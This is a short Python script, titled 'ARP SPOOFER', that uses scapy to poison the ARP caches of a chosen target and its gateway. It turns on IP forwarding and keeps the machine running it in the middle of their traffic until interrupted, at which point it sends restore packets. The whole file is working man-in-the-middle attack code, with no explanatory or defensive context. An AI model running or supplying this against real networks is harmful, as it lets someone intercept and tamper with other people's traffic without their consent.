#/usr/bin/python
# ARP SPOOFER
import re
import scapy.all as scapy
import subprocess
import optparse
import time
import sys

def get_arguments():
    parser = optparse.OptionParser()

    parser.add_option("-t", "--target", dest="target", help="The IP of target machine.")

    (options, arguments) = parser.parse_args()
    if not options.target:
        parser.error("[.] Please specify a target IP, use --help for more info")
    return options


def scan(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")

    req_broadcast = broadcast/arp_request
    ans_list = scapy.srp(req_broadcast, timeout=1, verbose=0)[0]
    return (ans_list[0][1].hwsrc)


def spoof(target, spoof):
    target_mac = scan(target)
    packet = scapy.ARP(op=2, pdst=target, hwdst=target_mac, psrc=spoof)
    scapy.send(packet, verbose=False)

def get_router():
    res = subprocess.check_output(["route", "-n"])
    ip = re.search(r"\d\d\d.\d\d\d\.\d\d\d.\d", str(res))
    return (ip.group(0))

def restore(dest, src):
    dest_mac = scan(dest)
    src_mac = scan(src)
    packet = scapy.ARP(op=2, pdst=dest, psrc=src, hwdst=dest_mac, hwsrc=src_mac)
    scapy.send(packet, count=4, verbose=False)


def enable_ipv4():
    file=open("/proc/sys/net/ipv4/ip_forward","w")
    file.write("1")
    file.close()



options = get_arguments()
router_ip = get_router()
sent_count = 0
target_ip = options.target
print(router_ip)
enable_ipv4()
try:
    while True:
        spoof(target_ip, router_ip)
        spoof(router_ip, target_ip)
        sent_count += 2
        #for python 2.7------------------
        print("\r[+] Sent packets successfully = " + str(sent_count)),
        sys.stdout.flush()
        #-----------------
        #for python 3---------------------
        #print("\r[+] Sent packets = " + str(sent_count), end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[-] Keyboard Interrupt Detected")
    print("Quitting and Restoring...")
    restore(target_ip, router_ip)
    restore(router_ip, target_ip)

